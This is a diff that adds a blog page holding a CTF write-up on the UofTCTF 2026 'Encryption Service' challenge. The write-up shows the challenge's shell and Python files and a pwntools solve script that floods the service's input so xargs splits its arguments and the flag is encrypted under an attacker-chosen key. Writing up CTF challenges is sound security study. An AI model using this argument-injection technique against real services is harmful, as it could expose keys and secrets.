@@ -1,0 +1,222 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>MISC -- Encryption Service -- xargs_argument_injection | Salad の Blog</title><meta name="author" content="salad07"><meta name="copyright" content="salad07"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="1.0 Challenge xargs argument injection  2.0 Analysisencryption with arguement in xargs key plaintext flag enc.py 123456789101112131415161718192021222324252627282930313233import sysfrom Crypto.Cipher i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MISC -- Encryption Service -- xargs_argument_injection">
+<meta property="og:url" content="http://example.com/2026/01/12/MISC%20--%20Encryption%20Service%20--%20xargs_argument_injection/index.html">
+<meta property="og:site_name" content="Salad の Blog">
+<meta property="og:description" content="1.0 Challenge xargs argument injection  2.0 Analysisencryption with arguement in xargs key plaintext flag enc.py 123456789101112131415161718192021222324252627282930313233import sysfrom Crypto.Cipher i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2026-01-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-12T03:39:05.837Z">
+<meta property="article:author" content="salad07">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://example.com/2026/01/12/MISC%20--%20Encryption%20Service%20--%20xargs_argument_injection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'MISC -- Encryption Service -- xargs_argument_injection',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-01-12 11:39:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">25</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/diaries"><i class="fa-fw fa fa-book"></i><span> diaries</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/post.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="Salad の Blog"><span class="site-name">Salad の Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/diaries"><i class="fa-fw fa fa-book"></i><span> diaries</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">MISC -- Encryption Service -- xargs_argument_injection</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-11T16:00:00.000Z" title="Created 2026-01-12 00:00:00">2026-01-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-12T03:39:05.837Z" title="Updated 2026-01-12 11:39:05">2026-01-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/uoft-26/">uoft-26</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/uoft-26/misc/">misc</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/uoft-26/misc/xargs/">xargs</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">894</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>4min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="MISC -- Encryption Service -- xargs_argument_injection"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1-0-Challenge"><a href="#1-0-Challenge" class="headerlink" title="1.0 Challenge"></a>1.0 Challenge</h1><ol>
+<li>xargs argument injection</li>
+</ol>
+<h1 id="2-0-Analysis"><a href="#2-0-Analysis" class="headerlink" title="2.0 Analysis"></a>2.0 Analysis</h1><p>encryption with arguement in xargs key plaintext flag</p>
+<p>enc.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;hex_key&gt; &lt;plaintext...&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># arg1 = hex key</span></span><br><span class="line">    key_hex = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = <span class="built_in">bytes</span>.fromhex(key_hex)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid hex key&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="number">16</span>:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># arg2..N = plaintext</span></span><br><span class="line">    pt = <span class="string">&quot;\n&quot;</span>.join(sys.argv[<span class="number">2</span>:]).encode()</span><br><span class="line"></span><br><span class="line">    iv = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">    ct = cipher.encrypt(pad(pt, AES.block_size))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(iv.<span class="built_in">hex</span>() + ct.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>run.sh —&gt; this is important </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">OUTFILE=<span class="string">&quot;/tmp/input.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">head</span> -c 16 /dev/urandom | <span class="built_in">od</span> -An -tx1 | <span class="built_in">tr</span> -d <span class="string">&#x27; &#x27;</span> &gt; <span class="string">&quot;<span class="variable">$OUTFILE</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to the encryption service&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Please put in all your plaintexts&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;End with EOF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">read</span> -r line</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$line</span>&quot;</span> = <span class="string">&quot;EOF&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span> &gt;&gt; <span class="string">&quot;<span class="variable">$OUTFILE</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;As a bonus we will also encrypt the flag for you&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /flag.txt &gt;&gt; <span class="string">&quot;<span class="variable">$OUTFILE</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Here is the encryption.&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(cat <span class="string">&quot;<span class="variable">$OUTFILE</span>&quot;</span> | xargs /app/enc.py)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>can see the xargs argument passing is like </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deadbeefdeadbeefdeadbeefdeadbeef  &lt;-- 第一行：系统生成的随机密钥 (32 hex chars)</span><br><span class="line">AAAA                              &lt;-- 中间：你输入的所有内容</span><br><span class="line">uoftctf&#123;fake&#125;                     &lt;-- 最后：Flag</span><br></pre></td></tr></table></figure>
+
+<p>the issue here is if the input long enuf<br>xargs will split to 2 script to send<br>like </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = aaaaaaaaaaaaaaaa * ARG_MAX</span><br><span class="line">payload += key (000000) &lt;------ 32 length </span><br></pre></td></tr></table></figure>
+
+<p>now the pattern will be like </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Batch 1: enc.py [TrueKey] [useless buffer...] -&gt; use real key to encrypt useless buffer</span><br><span class="line">    </span><br><span class="line">Batch 2: enc.py [my 000 Key] [Flag] -&gt; Bingo! </span><br></pre></td></tr></table></figure>
+<h1 id="3-0-Solution"><a href="#3-0-Solution" class="headerlink" title="3.0 Solution"></a>3.0 Solution</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你有远程地址，取消下面这行的注释并填入 IP 和端口</span></span><br><span class="line"><span class="comment"># r = remote(&#x27;ip_address&#x27;, port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地测试用（假设你在本地运行了 docker 或直接运行脚本）</span></span><br><span class="line"><span class="comment"># 这里的 process 只是为了演示，实际上你需要连远程</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./run.sh&#x27;) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. 准备我们的 &quot;Fake Key&quot;</span></span><br><span class="line">    <span class="comment"># 必须是 32 个字符的 Hex (16 bytes)</span></span><br><span class="line">    my_key_hex = <span class="string">&quot;00&quot;</span> * <span class="number">16</span> </span><br><span class="line">    my_key_bytes = <span class="built_in">bytes</span>.fromhex(my_key_hex)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Using Fake Key: <span class="subst">&#123;my_key_hex&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 构造 Payload</span></span><br><span class="line">    <span class="comment"># 我们需要发送超过 128KB (131072 bytes) 的数据来触发 xargs 分割</span></span><br><span class="line">    <span class="comment"># 我们发送大约 150KB</span></span><br><span class="line">    target_size = <span class="number">150</span> * <span class="number">1024</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 为了让 shell 脚本读取快一点，我们将 key 用空格连接，放在同一行里</span></span><br><span class="line">    <span class="comment"># 比如: &quot;00...00 00...00 00...00&quot;</span></span><br><span class="line">    chunk = my_key_hex + <span class="string">&quot; &quot;</span></span><br><span class="line">    repeats = target_size // <span class="built_in">len</span>(chunk)</span><br><span class="line">    payload = chunk * repeats</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Sending payload of size: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> bytes...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 发送数据</span></span><br><span class="line">    <span class="comment"># 等待提示</span></span><br><span class="line">    <span class="comment"># r.recvuntil(b&quot;plaintexts&quot;) </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送长 Payload</span></span><br><span class="line">    r.sendline(payload.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 结束输入</span></span><br><span class="line">    r.sendline(<span class="string">b&quot;EOF&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Payload sent. Waiting for response...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 接收并解密</span></span><br><span class="line">    <span class="comment"># 接收所有输出</span></span><br><span class="line">    <span class="comment"># r.recvuntil(b&quot;Here is the encryption.\n&quot;)</span></span><br><span class="line">    output = r.recvall().decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出中可能包含多行加密结果（因为 xargs 执行了多次）</span></span><br><span class="line">    <span class="comment"># 我们尝试解密每一段看起来像 Hex 的长字符串</span></span><br><span class="line">    lines = output.split()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="comment"># 密文格式: IV(32 chars) + Ciphertext(...)</span></span><br><span class="line">        <span class="comment"># 最小长度得有 IV</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(line) &lt; <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 尝试解析 Hex</span></span><br><span class="line">            blob = <span class="built_in">bytes</span>.fromhex(line)</span><br><span class="line">            iv = blob[:<span class="number">16</span>]</span><br><span class="line">            ct = blob[<span class="number">16</span>:]</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ct: <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 使用我们的 Fake Key 解密</span></span><br><span class="line">            cipher = AES.new(my_key_bytes, AES.MODE_CBC, iv)</span><br><span class="line">            pt = cipher.decrypt(ct)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查解密结果里有没有 flag</span></span><br><span class="line">            <span class="comment"># 因为我们的 payload 也是 key，所以解密出来会有很多 00000...</span></span><br><span class="line">            <span class="comment"># 我们只需要 grep &quot;uoftctf&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;uoftctf&quot;</span> <span class="keyword">in</span> pt:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[+] SUCCESS! Found Flag in decrypted text:&quot;</span>)</span><br><span class="line">                <span class="comment"># 提取并打印 Flag</span></span><br><span class="line">                start = pt.find(<span class="string">b&quot;uoftctf&quot;</span>)</span><br><span class="line">                end = pt.find(<span class="string">b&quot;&#125;&quot;</span>, start) + <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(pt[start:end].decode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># 这一行可能是用真 Key 加密的，或者不是密文，解密失败是正常的</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-0-FLAG"><a href="#4-0-FLAG" class="headerlink" title="4.0 FLAG"></a>4.0 FLAG</h1><p>dah<br>![[Pasted image 20260112113658.png]]</p>
+<h1 id="5-0-FINAL-SCRIPT"><a href="#5-0-FINAL-SCRIPT" class="headerlink" title="5.0 FINAL SCRIPT"></a>5.0 FINAL SCRIPT</h1><p>see solution </p>
+<h1 id="6-0-REFERENCE"><a href="#6-0-REFERENCE" class="headerlink" title="6.0 REFERENCE"></a>6.0 REFERENCE</h1><p><a target="_blank" rel="noopener" href="https://gemini.google.com/app/30c6584f61006706">https://gemini.google.com/app/30c6584f61006706</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">salad07</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/12/MISC%20--%20Encryption%20Service%20--%20xargs_argument_injection/">http://example.com/2026/01/12/MISC%20--%20Encryption%20Service%20--%20xargs_argument_injection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="whatsapp,linkedin,wechat"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/01/12/MISC%20--%20Guess%20The%20Number%20--%20timing_side-channel_attack/" title="MISC -- Guess The Number -- timing_side-channel_attack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">MISC -- Guess The Number -- timing_side-channel_attack</div></div></a></div><div class="next-post pull-right"><a href="/2026/01/12/MISC%20--%20loterry%20--%20Arithmetic_Injection/" title="MISC -- loterry -- Arithmetic_Injection"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">MISC -- loterry -- Arithmetic_Injection</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">salad07</div><div class="author-info__description">为了ta 拼尽全力</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">25</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/saladbkp"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">SUP, a student who 24/7 fixing bugs, 努力从小白进化成小小白, 頑張れ~ 🔥</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-0-Challenge"><span class="toc-number">1.</span> <span class="toc-text">1.0 Challenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-0-Analysis"><span class="toc-number">2.</span> <span class="toc-text">2.0 Analysis</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-0-Solution"><span class="toc-number">3.</span> <span class="toc-text">3.0 Solution</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-0-FLAG"><span class="toc-number">4.</span> <span class="toc-text">4.0 FLAG</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-0-FINAL-SCRIPT"><span class="toc-number">5.</span> <span class="toc-text">5.0 